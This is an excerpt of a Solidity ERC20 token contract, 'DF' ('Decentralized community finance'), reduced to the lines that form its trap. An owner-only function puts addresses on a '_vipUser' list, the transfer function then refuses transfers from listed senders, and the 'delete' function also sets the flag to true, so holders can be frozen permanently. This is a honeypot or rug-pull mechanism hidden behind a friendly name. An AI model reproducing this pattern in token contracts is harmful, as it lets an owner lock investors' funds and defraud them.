...
contract DF is IERC20, Ownable {
	...
	mapping(address => bool) public _vipUser;
    ...
    address _fundAddress = address(0x338089A4EFa2AFba720159CF0A16a5B519959de1);
    address _fundSellAddress = address(0x66fC7207b0D32acBd0B1bdcaF12c4c3ffa4b8A6c);
    mapping(address => address) public inviter;
    address public uniswapV2Pair;
    uint256 public startTime;
    bool swapStats;
    constructor(address tokenOwner) {
        _name = "Decentralized community finance";
        _symbol = "DF";
        _decimals = 18;
	...
	function addVipUser(address user) public onlyOwner {
        _vipUser[user] = true;
    }
	
	function deleteVipUser(address user) public onlyOwner {
        _vipUser[user] = true;
    }
    ...
    function _transfer(
        ...
        require(!_vipUser[from],"you are vip");
